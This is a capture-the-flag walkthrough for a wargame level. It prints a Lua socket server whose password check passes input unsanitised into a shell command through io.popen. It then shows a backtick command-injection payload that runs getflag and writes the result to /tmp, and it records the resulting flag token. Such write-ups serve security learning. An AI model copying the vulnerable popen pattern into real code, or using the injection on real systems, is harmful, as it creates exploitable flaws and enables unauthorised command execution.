

# **Level11**

### **Walk through**

This timing we're facing a lua script `level11.lua`.

`cat level11.lua`

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

```

We can notice that there's a server listening on 127.0.0.1 -p 5151. 

`nc 127.0.0.1 5151`  
		`$> Password:`  

Looking at the script, we see that what we're going to input as "password" will be echoed. Indeed: **`prog = io.popen("echo "..pass.." | sha1sum", "r")`**  

Thanks to the past levels, we now know that everything we pass to the echo command between back ticks will be executed. 

If we give this as input: **\`getflag\` > /tmp/flag11** , we can `cat /tmp/flag11` which gives us **fa6v5ateaw21peobuub8ipe6s**

We will use it to log as level12

`su level12`
